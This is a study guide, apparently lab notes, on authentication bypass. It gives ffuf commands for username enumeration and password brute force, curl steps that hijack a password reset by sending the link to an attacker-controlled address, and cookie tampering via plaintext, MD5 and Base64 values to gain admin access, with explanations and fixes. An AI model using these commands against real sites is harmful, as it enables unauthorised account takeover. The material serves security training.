# Authentication Bypass

## 🔍 Overview

**Authentication bypass** covers techniques for circumventing login mechanisms — gaining access to accounts, elevated privileges, or protected resources without valid credentials. Rather than cracking passwords, these techniques exploit weaknesses in how the application validates identity.

| Technique | What It Exploits |
|-----------|-----------------|
| **Username Enumeration** | Different server responses reveal which usernames exist |
| **Brute Force** | Automated password guessing against known valid usernames |
| **Logic Flaws** | Broken application logic that allows bypassing auth checks entirely |
| **Cookie Tampering** | Modifying session cookies to fake identity or escalate privileges |

---

## 👤 Username Enumeration

Before brute-forcing passwords, you need a list of valid usernames. Many applications reveal whether a username exists through different error messages — *"username already exists"* vs *"invalid credentials"*.

**Tool:** [ffuf](https://github.com/ffuf/ffuf)

### Command

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.80.175.120/customers/signup \
     -mr "username already exists"
```

| Flag | Description |
|------|-------------|
| `-w` | Wordlist of usernames to test |
| `-X POST` | HTTP method — POST by default for form submissions (GET is ffuf's default) |
| `-d` | POST body data — `FUZZ` is replaced with each wordlist entry |
| `-H` | Add a header — `Content-Type: application/x-www-form-urlencoded` tells the server we're sending form data |
| `-u` | Target URL |
| `-mr` | Match on response text — only show results where the response contains this string |
| `-o valid_usernames.txt` | Save results to a file for use in brute forcing |
| `-s` | Silent mode — outputs only found usernames, no progress info |

**Full command with output:**
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.80.175.120/customers/signup \
     -mr "username already exists" \
     -o valid_usernames.txt -s
```

> **Why this works:** If the error message changes based on whether a username exists, the application is leaking information. A secure implementation returns the same generic message regardless — e.g. *"Incorrect username or password"* — so no enumeration is possible.

---

## 💥 Brute Force

Once you have a list of valid usernames, brute force tests common passwords against each one — automating what would take hours manually.

### Command

```bash
ffuf -w valid_usernames.txt:W1,\
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.80.175.120/customers/login \
     -fc 200
```

| Flag | Description |
|------|-------------|
| `-w list1:W1,list2:W2` | Multiple wordlists with named keywords — `W1` and `W2` replace their respective lists |
| `W1` | Valid username list (from enumeration step) |
| `W2` | Password wordlist |
| `-d "username=W1&password=W2"` | POST body — both keywords are substituted on each iteration |
| `-fc 200` | **Filter** responses with status code 200 — a 200 on a failed login means we want to find responses that differ (302 redirect = successful login) |

> **Logic behind `-fc 200`:** A failed login typically returns HTTP 200 (the login page reloads with an error). A successful login typically redirects (302). Filtering out 200s leaves only the successful hits.

---

## 🧠 Logic Flaws

A **logic flaw** occurs when the application's intended security check can be bypassed, circumvented, or manipulated — not by breaking encryption, but by exploiting how the code makes decisions.

### Code Example

```javascript
if (url.substr(0, 6) === '/admin') {
    // Check if user is an admin
} else {
    // Display page without checking
}
```

**The flaw:** `===` is a case-sensitive comparison. A request to `/Admin` or `/ADMIN` skips the admin check entirely and displays the page — the logic only protects the exact lowercase string `/admin`.

---

### Password Reset Logic Flaw — Worked Example

This example shows how a flawed password reset flow can be abused to take over another user's account.

**Step 1 — Send the reset request with the victim's email in the URL, but your email in the POST body:**
```bash
curl 'http://10.80.167.115/customers/reset?email=robert%40acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=attacker@hacker.com'
```

The server reads the `email` parameter from the POST body — not the URL. The reset link is sent to the attacker's email address while targeting Robert's account.

**Step 2 — Create a new account on the site** to gain access to the customer dashboard (where reset links are delivered).

**Step 3 — Redirect the reset link to your new account's email:**
```bash
curl 'http://10.80.167.115/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
```

The reset link arrives in your dashboard — you click it and set a new password for Robert's account.

> **The flaw:** The application uses different sources for the email address depending on the step — URL query string in one place, POST body in another. An attacker can supply conflicting values to redirect a sensitive operation to a controlled address.

---

## 🍪 Cookie Tampering

Cookies often store session state, user identity, or privilege level. If these values are not properly protected (unsigned, unencrypted, or predictable), an attacker can modify them to fake a different identity or escalate privileges.

---

### Plain Text Cookies

Some applications store sensitive state directly in cookies as readable text:

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

**Exploitation with curl:**

```bash
# Step 1 — Request without cookies → not logged in
curl http://10.80.167.115/cookie-test

# Step 2 — Set logged_in=true, admin=false → logged in as regular user
curl -H "Cookie: logged_in=true; admin=false" http://10.80.167.115/cookie-test

# Step 3 — Set logged_in=true, admin=true → logged in as admin
curl -H "Cookie: logged_in=true; admin=true" http://10.80.167.115/cookie-test
```

> Simply changing `admin=false` to `admin=true` grants admin access. This is a critical vulnerability — privilege decisions should never be made based on an unprotected client-controlled value.

---

### Hashed Cookies

Some applications store a hash of the value rather than plaintext — e.g. `admin=5f4dcc3b5aa765d61d8327deb882cf99` (MD5 of `password`).

**How to crack:** Use a hash lookup database:
→ [CrackStation](https://crackstation.net/) — reverse-lookup database of billions of hash:plaintext pairs

> Hashing alone is not sufficient if weak algorithms (MD5, SHA-1) are used — these are trivially reversible via rainbow tables. Secure implementations use HMACs (Hash-based Message Authentication Codes) with a server-side secret key, so clients cannot forge valid values.

---

### Encoded Cookies

**Encoding** (e.g. Base64) is often confused with encryption — but it is fully reversible without any key. An encoded cookie is not protected.

| Encoding | Character Set |
|----------|--------------|
| **Base32** | `A–Z` and `2–7` — used for case-insensitive contexts |
| **Base64** | `a–z`, `A–Z`, `0–9`, `+`, `/`, `=` (padding) — the most common |

**Example exploitation:**

```
# Cookie received after login
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/

# Step 1 — Decode the Base64 value
eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==  →  {"id":1,"admin":false}

# Step 2 — Modify the value
{"id":1,"admin":false}  →  {"id":1,"admin":true}

# Step 3 — Re-encode to Base64
{"id":1,"admin":true}  →  eyJpZCI6MSwiYWRtaW4iOnRydWV9

# Step 4 — Send the modified cookie
curl -H "Cookie: session=eyJpZCI6MSwiYWRtaW4iOnRydWV9" http://target.com/dashboard
```

> **Quick Base64 in terminal:**
> ```bash
> # Decode
> echo "eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==" | base64 -d
>
> # Encode
> echo -n '{"id":1,"admin":true}' | base64
> ```

> **The fix:** Cookies containing privilege or identity data must be cryptographically signed with a server-side secret (e.g. using HMAC-SHA256). The server verifies the signature on every request — any tampering invalidates the signature and the cookie is rejected.
